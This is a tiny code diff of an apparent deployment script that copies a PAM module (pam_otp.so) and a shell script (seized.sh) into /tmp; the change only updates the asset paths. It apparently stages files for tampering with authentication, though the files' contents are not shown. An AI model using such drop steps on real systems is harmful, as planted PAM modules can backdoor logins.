@@ -1,7 +1,7 @@
 def drop_files():
     if file.is_dir("/tmp"):
-        assets.copy("pam_otp.so","/tmp/pam_otp.so")
-        assets.copy("seized.sh","/tmp/seized.sh")
+        assets.copy("deploy_otptome/assets/pam_otp.so","/tmp/pam_otp.so")
+        assets.copy("deploy_otptome/assets/seized.sh","/tmp/seized.sh")
     
 def main():
 
